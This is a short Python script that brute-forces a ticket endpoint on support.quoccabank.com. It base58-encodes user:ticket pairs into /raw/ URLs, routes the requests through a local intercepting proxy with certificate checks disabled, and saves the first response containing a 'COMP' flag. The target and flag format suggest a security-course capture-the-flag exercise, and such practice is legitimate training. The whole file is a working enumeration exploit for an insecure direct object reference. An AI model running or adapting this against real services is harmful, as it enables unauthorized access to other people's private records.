import requests
import base58
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

for user in range(1, 10000):
    for ticket in range(1, 10000):
        print(f"Trying {user}:{ticket}")
        r = requests.get(f"https://support.quoccabank.com/raw/{base58.b58encode(str(user) +':'+ str(ticket)).decode('utf-8')}", proxies=proxies, verify=False)
        if ("COMP" in r.text):
            f = open("flags.txt", "w")
            f.write(r.text)
            break
    else:
        continue
    break